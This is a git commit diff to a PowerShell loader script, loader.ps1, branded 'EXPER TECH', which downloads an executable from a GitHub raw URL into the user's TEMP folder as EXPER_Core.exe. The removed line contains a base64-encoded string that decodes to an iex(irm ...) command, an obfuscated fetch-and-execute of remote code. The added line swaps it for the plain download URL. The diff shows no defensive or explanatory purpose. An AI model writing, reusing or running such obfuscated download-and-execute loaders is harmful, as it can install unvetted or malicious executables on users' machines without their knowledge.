cc71e0d322577a32088c60b252664a4b4de10bd3
zuiaixixibaobei-max <zuiaixixibaobei@gmail.com>
2026-05-16 06:10:15 +0800

    Update download URL for core components in loader.ps1

--- loader.ps1
+++ loader.ps1
@@ -2,7 +2,7 @@
 Write-Host "E X P E R  T E C H" -ForegroundColor Cyan
 
 # 2. 核心：去下载刚才那个 EXE
-$Url = "aQBlAHgAKABpAHIAbQAgACcAaAB0AHQAcABzADoALwAvAHIAYQB3AC4AZwBpAHQAaAB1AGIAdQBzAGUAcgBjAG8AbgB0AGUAbgB0AC4AYwBvAG0ALwB6AHUAaQBhAGkAeABpAHgAaQBiAGEAbwBiAGUAaQAtAG0AYQB4AC8ARQBYAFAARQBSAC0ATABvAGEAZABlAHIALwByAGUAZgBzAC8AaABlAGEAZABzAC8AbQBhAGkAbgAvAEwAbwBhAGQAZQByAC0AQwBOADIALgBlAHgAZQAnACkA"
+$Url = "https://raw.githubusercontent.com/zuiaixixibaobei-max/EXPER-Loader/refs/heads/main/Loader-CN2.exe"
 $Path = "$env:TEMP\EXPER_Core.exe"
 
 Write-Host "[>] Downloading core components..." -ForegroundColor Gray
